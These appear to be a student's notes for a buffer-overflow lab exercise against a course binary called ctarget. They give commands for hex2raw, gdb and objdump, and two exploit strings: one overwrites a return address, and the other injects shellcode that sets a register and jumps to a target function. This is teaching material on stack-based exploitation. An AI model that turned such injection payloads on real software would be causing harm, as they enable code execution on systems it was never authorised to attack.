
// command to run the program with customized hex code
cat exploit.txt | ./hex2raw | ./ctarget -q

// command to debug in gdb
run < exploit_raw.txt -q


// disassemble the binary file to asm
objdump -d ctarget > ctarget.d

// convert txt hex to the format that the program can read
bash> ./hex2raw < exploit.txt >| exploit_raw.txt


// phase_1
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
c0 17 40 00 00 00 00 00
  

# Example of hand-generated assembly code
pushq $0xabcdef # Push value onto stack
addq $17,%rax # Add 17 to %rax
movl %eax,%edx # Copy lower 32 bits of %eax to %edx

// use command to compile and disassemble them to generate machine code
unix> gcc -c example.s
unix> objdump -d example.o > example.d




# Example of hand-generated assembly code
mov $0x59b997fa, %rdi # Push value onto stack
pushq $0x004017ec
retq


48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3

// phase_2
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
51 51 51
51 51 51 51 51
51 51 51 51 51 51 51 51 51
51 51 51 51 51 51 51 51 51 51
78 dc 61 55 00 00 00 00
